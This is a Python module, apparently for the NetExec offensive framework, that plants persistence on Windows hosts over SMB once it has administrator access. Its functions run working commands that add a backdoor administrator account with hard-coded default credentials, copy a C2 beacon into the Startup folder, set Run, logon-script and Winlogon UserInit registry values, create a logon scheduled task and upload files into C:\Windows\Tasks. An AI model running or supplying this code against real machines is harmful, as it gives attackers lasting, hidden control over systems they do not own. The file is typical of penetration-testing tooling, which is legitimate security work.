#!/usr/bin/env python3
# -*- coding: utf-8 -*-  # noqa: UP009

class NXCModule:
    """
    Implements persistence techniques used by APT's and Red Teamers/Pentesters
    
    Created by Lorenzo Meacci @kapla founder of the 0xH3xSec community!
    """

    name = 'persistence'
    description = "Implements techniques for persistence used by malicious actors"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        """
        TECHNIQUE: String that specifies the persistence technique to use (only 'add_user' implemented).
        1. 'add_user' - Adds a new user/admin to the machine
        2. 'malicious_binary' - Puts a malicious binary (C2 Beacon) in the startup folder
        3. 'registry_run' - Modifies the Registry run key to launch the C2 Beacon
        4. 'logon_script' - .bat logon script at boot
        5. 'scheduled_task' - Creates a task that trriggers at logon
        6. 'win_logon_userinit' - Modifies the "UserInit" registry of WinLogon
        """
        self.TECHNIQUE = module_options["TECHNIQUE"]
        self.BINARY = "Do_not_execute"
        self.user = "kapla2"
        self.password = "Join_The_0xH3xSec_Community!"
        self.file = "Do_not_execute"
        self.file_name = ""
        if 'USER' in module_options:
            self.user = module_options['USER']
        if 'PASS' in module_options:
            self.password = module_options['PASS']
        if 'BINARY' in module_options:
            self.BINARY = module_options['BINARY']
        if 'FILE' in module_options:
            self.file = module_options['FILE']
        if 'FILE_NAME' in module_options:
            self.file_name = module_options['FILE_NAME']

        
 
    def on_admin_login(self, context, connection):
        # Check TECHNIQUE and execute add_user if specified 
        if self.TECHNIQUE == "add_user":
            self.add_user(context, connection)
        elif self.TECHNIQUE == "malicious_binary":
            if self.BINARY != "Do_not_execute":
                self.malicious_binary(context , connection)
            else:
                context.log.error("You need to specify the BINARY path!!!")
        elif self.TECHNIQUE == "registry_run":
            if self.BINARY != "Do_not_execute":
                self.registry_run(context , connection)
            else:
                context.log.error("You need to specify the BINARY path!!!")
        elif self.TECHNIQUE == "logon_script":
            if self.BINARY != "Do_not_execute":
                self.logon_script(context , connection)
            else:
                context.log.error("You need to specify the BINARY path!!!")
        elif self.TECHNIQUE == "scheduled_task":
            if self.BINARY != "Do_not_execute":
                self.scheduled_task(context , connection)
            else:
                context.log.error("You need to specify the BINARY path!!!")      
        elif self.TECHNIQUE == "win_logon_userinit":
            if self.BINARY != "Do_not_execute":
                self.win_logon_userinit(context , connection)
            else:
                context.log.error("You need to specify the BINARY path!!!")
        elif self.TECHNIQUE == "file_upload":
            self.file_upload(context , connection)
        
        
        

    def add_user(self, context, connection):
        """
        Adds a new user to the Admin group.
        """
        if self.user == "kapla2" and self.password == "Join_The_0xH3xSec_Community!":
                context.log.highlight("No credentials were submitted!!! Using default user and default password!!!")
        context.log.highlight(f'Adding user {self.user}:{self.password} to the Admin group.')
        command = f'(net user {self.user} "{self.password}" /add /Y && net localgroup administrators {self.user} /add)'
        output = connection.execute(command, True)
        context.log.highlight(output)
        
    def malicious_binary(self , context , connection):
        """
        Puts a malicious binary in the startup folder es BINARY=C:\\Windows\\Tasks\\beacon.exe
        """
        command = f'copy {self.BINARY} "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"'
        context.log.highlight(f'Adding {self.BINARY} to the Start Up Folder')
        p = connection.execute(command, True)
        context.log.highlight(p)
        
    def registry_run(self , context , connection):
        """
        Modifies the Registry run key to launch the specified binary
        """
        command = f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v MyApp /t REG_SZ /d {self.BINARY} /f'
        context.log.highlight(f'adding the {self.BINARY} to the Run Registry')
        p = connection.execute(command , True)
        context.log.highlight(p)
    
    def logon_script(self , context , connection):
        """
        Setup's one of the registry value to the specified .bat file
        """
        command = f'reg add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /d "{self.BINARY}" /t REG_SZ /f'
        context.log.highlight(f'adding the {self.BINARY} to the Logon Script')
        p = connection.execute(command , True)
        context.log.highlight(p)
    
    def scheduled_task(self, context , connection):
        """
        Created a task that triggers at logon
        """
        command = f'schtasks /create /sc onlogon /tn UpDater2.0 /tr "{self.BINARY}"'
        context.log.highlight(f'Creating the logon task with the path : {self.BINARY}')
        p = connection.execute(command , True)
        context.log.highlight(p)
    
    def win_logon_userinit(self , context , connection):
        command = fr'reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "UserInit" /T REG_SZ /D "C:\Windows\system32\userinit.exe,{self.BINARY}" /F'
        context.log.highlight(fr'Modifying the WinLogon UserInit value to : C:\Windows\system32\userinit.exe ,  {self.BINARY}')
        p = connection.execute(command , True)
        context.log.highlight(p)
    
    def file_upload(self, context, connection):
        share = "C$"
        file_path = f"Windows/Tasks/{self.file_name}" 
    
        # Ensure both FILE and FILE_NAME are provided
        if self.file == "Do_not_execute" and self.file_name == "":
            context.log.error("You need to specify the file path FILE= and how you want to save the file on the system FILE_NAME")
            return

        try:
            # Open the local file and read its content
            with open(self.file, "rb") as file_stream:
                connection.conn.putFile(share, file_path, file_stream.read)
            context.log.highlight(f"Successfully uploaded {self.file} to C:\Windows\Tasks\{self.file_name} on the target.")
        except Exception as e:
            context.log.error(f"Failed to upload file: {e}")
